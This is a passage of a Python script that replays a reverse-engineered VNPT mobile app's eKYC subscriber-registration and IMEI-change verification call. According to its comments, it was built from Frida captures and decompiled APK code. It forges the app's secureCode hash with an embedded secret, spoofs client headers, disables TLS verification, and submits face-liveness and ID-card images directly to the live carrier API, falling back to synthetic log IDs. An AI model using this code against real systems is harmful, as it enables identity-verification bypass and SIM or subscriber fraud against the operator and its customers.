    if SAVE_LOG_RESP:
        # Update ekycRequestLogId for subsequent calls
        if SAVE_LOG_RESP.get("result"):
            EKYC_REQUEST_LOG_ID = SAVE_LOG_RESP["result"].get("ekycRequestLogId", 0)
            print(f"\n  Updated EKYC_REQUEST_LOG_ID: {EKYC_REQUEST_LOG_ID}")

    print("\n" + SEP)
    print("  STEP 3: saveLogEkyc - DONE")
    print(SEP)

    # ===========================================================================
    # STEP 4: verifyImeiChange - Call cuoi cung hoan tat DKTTTB!
    # Confirmed from Frida capture: multipart/form-data, Bearer token only (no AES/RSA)
    # liveNessFace = base64(full IDG liveness JSON response text)
    # ===========================================================================
    print("\n" + SEP)
    print("  STEP 4: verifyImeiChange (DKTTTB completion)")
    print(SEP)

    VERIFY_OK = False
    VERIFY_RESP = None

    if LIVE_HTTP_OK and LIVE_DATA_SIGN:  # Only call if liveness succeeded
        try:
            verify_url = "https://api-myvnpt.vnpt.vn/tel_service/imei/verifyImeiChange"
        
            # FIX 4: liveNessFace = dataBase64 tu IDG SDK (khong fallback base64 cua ca JSON)
            if not LIVE_DATA_B64:
                raise RuntimeError("LIVE_DATA_B64 is empty - IDG SDK did not return dataBase64")
            live_face_b64 = LIVE_DATA_B64
        
            # New requestId for this verify call
            VERIFY_REQ_ID = str(uuid.uuid4())
        
            # FIX 2: liveNessFaceLogId & maskedFaceLogId tu IDG SDK (...-Zuulserver)
            live_face_log_id   = LIVE_LOG_ID or f"{TOKEN_ID}-Zuulserver"
            masked_face_log_id = MASK_LOG_ID or f"{TOKEN_ID}-Zuulserver"
            print(f"  liveNessFaceLogId: {live_face_log_id}")
            print(f"  maskedFaceLogId:   {masked_face_log_id}")

            # FIX 3: clientSession nhat quan voi SDK session
            _verify_client_session = _ACTIVE_SESSION or CONFIG_CLIENT_SESSION or CLIENT_SESSION
            print(f"  clientSession:     {_verify_client_session[:60]}...")
        
            # secureCode formula tu APK Uiv3VerifyEmeiViewModel:
            # SHA256(MSISDN|msisdnChangeImei|clientSession|challengeCode|dataEKYC|front|back|compare|liveLog|maskLog|SECRET)
            # FACE_ONLY flow: 5 dau | ngan cach giua challengeCode va liveNessFaceLogId
            VERIFY_SECURE = hashlib.sha256(
                (f"{MSISDN}|{MSISDN}|{_verify_client_session}|{CHALLENGE_CODE_HEX}"
                 f"|||||{live_face_log_id}|{masked_face_log_id}|{SECRET_AUTHEN}").encode()
            ).hexdigest()
            print(f"  secureCode: {VERIFY_SECURE}")
        
            # All fields from VerifyEmeiRequest.java (confirmed from decompiled source)
            verify_request = {
                "msisdn":               MSISDN,
                "msisdnChangeImei":     MSISDN,          # same MSISDN for own device
                "session":              SESSION_ID,
                "requestId":            VERIFY_REQ_ID,
                "challengeCode":        CHALLENGE_CODE_HEX,
                "clientSession":        _verify_client_session,
                "secureCode":           VERIFY_SECURE,
                # Card fields (empty for FACE_ONLY flow)
                "dataEKYC":             "",
                "signEKYC":             "",
                "logIdEKYC":            "",
                "liveNessCardFront":    "",
                "liveNessCardFrontSign":"",
                "livenessCardFrontLogId":"",
                "liveNessCardBack":     "",
                "liveNessCardBackSign": "",
                "liveNessCardBackLogId":"",
                "compareFace":          "",
                "compareFaceSign":      "",
                "compareFaceLogId":     "",
                # Liveness face data
                "liveNessFace":         live_face_b64,
                "liveNessFaceSign":     LIVE_DATA_SIGN,
                "liveNessFaceLogId":    live_face_log_id,
                # Masked face
                "maskedFace":           MASK_DATA_B64 or "",
                "maskedFaceSign":       MASK_DATA_SIGN or "",
                "maskedFaceLogId":      masked_face_log_id,
            }
        
            verify_headers = {
                "Cache-Control": "no-cache",
                "Device-Info":   DEVICE_INFO,
                "Language":      "vi_VN",
                "Authorization": BEARER_TOKEN,
                "User-Agent":    "okhttp/4.7.2",
            }
        
            verify_json_str = json.dumps(verify_request, ensure_ascii=False)
            print(f"  liveNessFace length: {len(live_face_b64)} chars")
            print(f"  request JSON length: {len(verify_json_str)} bytes")
            print(f"  Calling verifyImeiChange...")

            # FIX 5: portraitImage (far_portrait_preview.jpg tu APK)
            face_bytes = b""
            if os.path.exists(FACE_OWNER_FILE):
                with open(FACE_OWNER_FILE, "rb") as fi:
                    face_bytes = fi.read()
            if not face_bytes:
                raise RuntimeError(f"portraitImage is empty - face file missing: {FACE_OWNER_FILE}")
            print(f"  portrait: {len(face_bytes)} bytes")

            # FIX 1: frontImage/backImage - khi rong (FACE_ONLY), APK gui filename="" text/plain
            cccd_front_bytes = b""
            if os.path.exists(CCCD_FRONT_FILE):
                with open(CCCD_FRONT_FILE, "rb") as fi:
                    cccd_front_bytes = fi.read()
            cccd_back_bytes = b""
            if os.path.exists(CCCD_BACK_FILE):
                with open(CCCD_BACK_FILE, "rb") as fi:
                    cccd_back_bytes = fi.read()
            print(f"  CCCD front bytes: {len(cccd_front_bytes)}")
            print(f"  CCCD back bytes:  {len(cccd_back_bytes)}")

            if cccd_front_bytes:
                _front_part = (os.path.basename(CCCD_FRONT_FILE), cccd_front_bytes, "image/jpeg")
            else:
                _front_part = ("", b"", "text/plain")

            if cccd_back_bytes:
                _back_part = (os.path.basename(CCCD_BACK_FILE), cccd_back_bytes, "image/jpeg")
            else:
                _back_part = ("", b"", "text/plain")

            _verify_files = [
                ("request",        (None, verify_json_str, "application/json; charset=utf-8")),
                ("frontImage",     _front_part),
                ("backImage",      _back_part),
                ("portraitImage",  ("far_portrait_preview.jpg", face_bytes, "image/jpg")),
            ]
            r = None
            for _attempt in range(2):  # retry 1 lan neu timeout
                try:
                    r = myvnpt_sess.post(
                        verify_url,
                        headers=verify_headers,
                        files=_verify_files,
                        timeout=120,   # tang len 120s (server xu ly face comparison lau)
                        verify=False
                    )
                    break
                except Exception as _te:
                    print(f"  verifyImeiChange attempt {_attempt+1} ERROR: {_te}")
                    if _attempt == 0:
                        import time as _tm; _tm.sleep(3)
                    else:
                        r = None
            if r is None:
                print(f"  verifyImeiChange FAILED after retry (timeout)")
                raise Exception("verifyImeiChange timeout after retry")
            print(f"  HTTP: {r.status_code}")
            resp_text_safe = r.text[:800]
            print(f"  Response: {resp_text_safe}")

            # Detect WAF HTML response
            _body = (r.text or "").lstrip()
            if _body.lower().startswith(("<html", "<!doc")) or "request rejected" in _body.lower():
                import re as _re
                _sid = (_re.search(r"support\s+id\s+is\s*:\s*([A-Za-z0-9_-]+)", _body, _re.I) or type("",(),{"group":lambda s,n:""})()).group(1)
                VERIFY_RESP = {"errorCode": "WAF_REJECTED", "supportId": _sid, "httpStatus": r.status_code}
                print(f"  verifyImeiChange WAF REJECTED (supportId={_sid})")
                raise RuntimeError(f"WAF_REJECTED: HTML response from gateway (supportId={_sid})")

            try:
                VERIFY_RESP = r.json()
            except (ValueError, json.JSONDecodeError) as _je:
                VERIFY_RESP = {"errorCode": "INVALID_JSON", "httpStatus": r.status_code, "body": r.text[:200]}
                raise RuntimeError(f"INVALID_JSON: HTTP {r.status_code}") from _je
            ec = VERIFY_RESP.get("errorCode", "")
            msg = VERIFY_RESP.get("message", "")
            result_v = VERIFY_RESP.get("result", {})
        
            if ec in ("0", "00"):
                VERIFY_OK = True
                full_name = result_v.get("fullName", "") if result_v else ""
                msisdn_change = result_v.get("msisdnChangeImei", "") if result_v else ""
                ekyc_flow = result_v.get("ekycFlow", "") if result_v else ""
                print(f"\n  *** DKTTTB THANH CONG! ***")
                print(f"  fullName:        {full_name}")
                print(f"  msisdnChangeImei:{msisdn_change}")
                print(f"  ekycFlow:        {ekyc_flow}")
            elif ec in ("1312", "1303"):
                # 1312 = "Thu bao của bn  ợc cp nht" (already updated before)
                # 1303 = already registered
                VERIFY_OK = True
                full_name = result_v.get("fullName", "") if result_v else ""
                msisdn_change = result_v.get("msisdnChangeImei", "") if result_v else ""
                ekyc_flow = result_v.get("ekycFlow", "") if result_v else ""
                print(f"\n  *** DKTTTB DA HOAN THANH TRUOC DO! (ec={ec}) ***")
                print(f"  fullName:        {full_name}")
                print(f"  msisdnChangeImei:{msisdn_change}")
                print(f"  ekycFlow:        {ekyc_flow}")
            else:
                print(f"  FAILED: errorCode={ec} | {msg}")

            
        except Exception as e:
            print(f"  verifyImeiChange ERROR: {e}")
    else:
        print("  Skipped: liveness failed, no face data to send")

    print("\n" + SEP)
    print("  STEP 4: verifyImeiChange - DONE")
    print(SEP)

    # ===========================================================================
    # STEP 10: Save all results
    # ===========================================================================
    log_id = f"{TOKEN_ID}-Zuulserver"
    results = {
        # For saveLogEkyc
        "challengeCode":      CHALLENGE_CODE_HEX,
        "session":            SESSION_ID,
        "msisdn":             MSISDN,
        "requestId":          REQUEST_ID,
        "ekycRequestLogId":   EKYC_REQUEST_LOG_ID,
        # Liveness data
        "liveNessFace":       LIVE_DATA_B64,
        "liveNessFaceSign":   LIVE_DATA_SIGN,
        "liveNessFaceLogId":  log_id,
        # Masked face
        "maskedFace":         MASK_DATA_B64,
        "maskedFaceSign":     MASK_DATA_SIGN,
        "maskedFaceLogId":    log_id,
        # Image hashes
        "nearHash":           NEAR_HASH,
        "farHash":            FAR_HASH,
        # eKYC metadata
        "ekycToken_access":   ACCESS_TOKEN,
        "ekycToken_id":       TOKEN_ID,
        "ekycExpire":         result.get("ekycExpireDate"),
        # SaveLog response
        "saveLogResponse":    SAVE_LOG_RESP,
        "verifyImeiResponse": VERIFY_RESP,
    }
    with open(os.path.join(HISTORY_DIR, "ekyc_result.json"), "w", encoding="utf-8") as f:
        json.dump(results, f, indent=2, ensure_ascii=False)

    print("\n" + SEP)
    liveness_ok = LIVE_HTTP_OK and bool(LIVE_DATA_SIGN)
    mask_ok     = MASK_HTTP_OK and bool(MASK_DATA_SIGN)
    save_log_ok = bool(
        SAVE_LOG_RESP is not None
        and str(SAVE_LOG_RESP.get('errorCode', '')).strip() in ('0', '00', '')
    )
    print(f"  DONE!")
    print(f"  Face mask:       {'OK' if mask_ok else 'FAILED'}")
    print(f"  Liveness:        {'OK' if liveness_ok else 'FAILED'}")
    print(f"  saveLogEkyc:     {'OK' if save_log_ok else 'FAILED'}")
    print(f"  verifyImeiChange:{'OK - DKTTTB HOAN TAT!' if VERIFY_OK else 'FAILED/SKIPPED'}")
    print(f"  Saved to:        ekyc_result.json")
    print(SEP)


if __name__ == "__main__":
    _main_cli()
